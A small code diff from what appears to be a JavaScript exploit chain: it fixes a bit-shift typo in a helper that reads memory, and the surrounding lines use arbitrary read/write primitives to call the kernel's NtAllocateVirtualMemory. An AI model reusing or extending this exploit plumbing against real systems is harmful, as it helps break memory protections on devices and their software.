@@ -42,7 +42,7 @@ const basePtr=params+0x20;
 const sizePtr=params+0x24;
 if((write32(basePtr,0)>>>0)!==1||(write32(sizePtr,0x1234)>>>0)!==1)throw new Error('unable to initialize NtAllocateVirtualMemory arguments');
 
-const readBe32=address=>((read8(address)<<<24)|(read8(address+1)<<<16)|(read8(address+2)<<<8)|read8(address+3))>>>0;
+const readBe32=address=>((read8(address)<<24)|(read8(address+1)<<16)|(read8(address+2)<<8)|read8(address+3))>>>0;
 
 // X_MEM_RESERVE | X_MEM_COMMIT, X_PAGE_READWRITE, DebugMemory=FALSE.
 const status=service(1,0x00CC,basePtr,sizePtr,0x3000,0x04,0,0,0,0)>>>0;
